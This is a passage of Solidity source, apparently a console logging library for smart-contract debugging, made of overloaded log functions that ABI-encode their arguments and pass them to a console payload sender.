internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes26)\", p0));\n    }\n\n    function logBytes27(bytes27 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes27)\", p0));\n    }\n\n    function logBytes28(bytes28 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes28)\", p0));\n    }\n\n    function logBytes29(bytes29 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes29)\", p0));\n    }\n\n    function logBytes30(bytes30 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes30)\", p0));\n    }\n\n    function logBytes31(bytes31 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes31)\", p0));\n    }\n\n    function logBytes32(bytes32 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes32)\", p0));\n    }\n\n    function log(uint p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint)\", p0));\n    }\n\n    function log(string memory p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string)\", p0));\n    }\n\n    function log(bool p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool)\", p0));\n    }\n\n    function log(address p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address)\", p0));\n    }\n\n    function log(uint p0, uint p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint)\", p0, p1));\n    }\n\n    function log(uint p0, string memory p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string)\", p0, p1));\n    }\n\n    function log(uint p0, bool p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool)\", p0, p1));\n    }\n\n    function log(uint p0, address p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address)\", p0, p1));\n    }\n\n    function log(string memory p0, uint p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint)\", p0, p1));\n    }\n\n    function log(string memory p0, string memory p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string)\", p0, p1));\n    }\n\n    function log(string memory p0, bool p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool)\", p0, p1));\n    }\n\n    function log(string memory p0, address p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address)\", p0, p1));\n    }\n\n    function log(bool p0, uint p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint)\", p0, p1));\n    }\n\n    function log(bool p0, string memory p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string)\", p0, p1));\n    }\n\n    function log(bool p0, bool p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool)\", p0, p1));\n    }\n\n    function log(bool p0, address p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address)\", p0, p1));\n    }\n\n    function log(address p0, uint p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint)\", p0, p1));\n    }\n\n    function log(address p0, string memory p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string)\", p0, p1));\n    }\n\n    function log(address p0, bool p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool)\", p0, p1));\n    }\n\n    function log(address p0, address p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address)\", p0, p1));\n    }\n\n    function log(uint p0, uint p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,uint)\", p0, p1, p2));\n    }\n\n    function log(uint p0, uint p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,string)\", p0, p1, p2));\n    }\n\n    function log(uint p0, uint p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,bool)\", p0, p1, p2));\n    }\n\n    function log(uint p0, uint p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,address)\", p0, p1, p2));\n    }\n\n    function log(uint p0, string memory p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,uint)\", p0, p1, p2));\n    }\n\n    function log(uint p0, string memory p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,string)\", p0, p1, p2));\n    }\n\n    function log(uint p0, string memory p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,bool)\", p0, p1, p2));\n    }\n\n    function log(uint p0, string memory p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,address)\", p0, p1, p2));\n    }\n\n    function log(uint p0, bool p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,uint)\", p0, p1, p2));\n    }\n\n    function log(uint p0, bool p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,string)\", p0, p1, p2));\n    }\n\n    function log(uint p0, bool p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,bool)\", p0, p1, p2));\n    }\n\n    function log(uint p0, bool p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,address)\", p0, p1, p2));\n    }\n\n    function log(uint p0, address p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,uint)\", p0, p1, p2));\n    }\n\n    function log(uint p0, address p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,string)\", p0, p1, p2));\n    }\n\n    function log(uint p0, address p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,bool)\", p0, p1, p2));\n    }\n\n    function log(uint p0, address p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,address)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, uint p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,uint)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, uint p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,string)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, uint p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,bool)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, uint p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,address)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, string memory p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,uint)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, string memory p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,string)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, string memory p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,bool)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, string memory p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,address)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, bool p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,uint)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, bool p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,string)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, bool p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,bool)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, bool p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,address)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, address p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,uint)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, address p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,string)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, address p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,bool)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, address p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,address)\", p0, p1, p2));\n    }\n\n    function log(bool p0, uint p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,uint)\", p0, p1, p2));\n    }\n\n    function log(bool p0, uint p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,string)\", p0, p1, p2));\n    }\n\n    function log(bool p0, uint p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,bool)\", p0, p1, p2));\n    }\n\n    function log(bool p0, uint p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,address)\", p0, p1, p2));\n    }\n\n    function log(bool p0, string memory p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,uint)\", p0, p1, p2));\n    }\n\n    function log(bool p0, string memory p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,string)\", p0, p1, p2));\n    }\n\n    function log(bool p0, string memory p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,bool)\", p0, p1, p2));\n    }\n\n    function log(bool p0, string memory p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,address)\", p0, p1, p2));\n    }\n\n    function log(bool p0, bool p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,uint)\", p0, p1, p2));\n    }\n\n    function log(bool p0, bool p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,string)\", p0, p1, p2));\n    }\n\n    function log(bool p0, bool p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,bool)\", p0, p1, p2));\n    }\n\n    function log(bool p0, bool p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,address)\", p0, p1, p2));\n    }\n\n    function log(bool p0, address p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,uint)\", p0, p1, p2));\n    }\n\n    function log(bool p0, address p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,string)\", p0, p1, p2));\n    }\n\n    function log(bool p0, address p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,bool)\", p0, p1, p2));\n    }\n\n    function log(bool p0, address p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,address)\", p0, p1, p2));\n    }\n\n    function log(address p0, uint p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,uint)\", p0, p1, p2));\n    }\n\n    function log(address p0, uint p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,string)\", p0, p1, p2));\n    }\n\n    function log(address p0, uint p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,bool)\", p0, p1, p2));\n    }\n\n    function log(address p0, uint p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,address)\", p0, p1, p2));\n    }\n\n    function log(address p0, string memory p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,uint)\", p0, p1, p2));\n    }\n\n    function log(address p0, string memory p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,string)\", p0, p1, p2));\n    }\n\n    function log(address p0, string memory p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,bool)\", p0, p1, p2));\n    }\n\n    function log(address p0, string memory p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,address)\", p0, p1, p2));\n    }\n\n    function log(address p0, bool p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,uint)\", p0, p1, p2));\n    }\n\n    function log(address p0, bool p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,string)\", p0, p1, p2));\n    }\n\n    function log(address p0, bool p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,bool)\", p0, p1, p2));\n    }\n\n    function log(address p0, bool p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,address)\", p0, p1, p2));\n    }\n\n    function log(address p0, address p1, uint p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,uint)\", p0, p1, p2));\n    }\n\n    function log(address p0, address p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,string)\", p0, p1, p2));\n    }\n\n    function log(address p0, address p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,bool)\", p0, p1, p2));\n    }\n\n    function log(address p0, address p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,address)\", p0, p1, p2));\n    }\n\n    function log(uint p0, uint p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, uint p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,uint,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, string memory p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,string,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, bool p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,bool,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint p0, address p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint,address,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, address p2, string memory p3) internal view {\n        